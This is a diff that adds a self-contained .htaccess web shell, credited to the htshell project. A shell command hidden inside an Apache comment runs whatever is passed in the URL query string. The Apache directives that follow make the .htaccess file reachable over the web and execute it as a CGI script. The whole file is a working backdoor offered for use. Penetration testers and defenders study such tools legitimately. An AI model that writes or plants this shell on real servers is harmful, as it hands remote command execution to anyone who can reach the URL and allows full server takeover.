@@ -1,0 +1,23 @@
+#!/bin/sh
+# Self contained .htaccess web shell - Part of the htshell project
+# Written by Wireghoul - http://www.justanotherhacker.com
+# IMPORTANT: Needs chmod +x to run
+# Run commands via http://url/.htaccess?cmd (ie: http://url/.htaccess?uname -a)
+
+# Big shout out to the rosetta code website which provided the example below!
+# This is considered a line spanning comment in apache and not by shell #winning \
+echo -en "Content-Type: text/plain\r\n\r\n";cmd=$(echo $QUERY_STRING | sed -e's/+/ /g' -e's/%20/ /g');echo "\$ $cmd";$cmd 2>&1;exit
+# The exit ensures we never reach the following lines which would break the shell parser
+
+# Override default deny rule to make .htaccess file accessible over web
+<Files ~ "^\.ht">
+    Order allow,deny
+    Allow from all
+</Files>
+
+# Enable  CGI
+Options +ExecCGI
+
+#Make apache treat .htaccess as a cgi file
+AddHandler cgi-script .htaccess
+
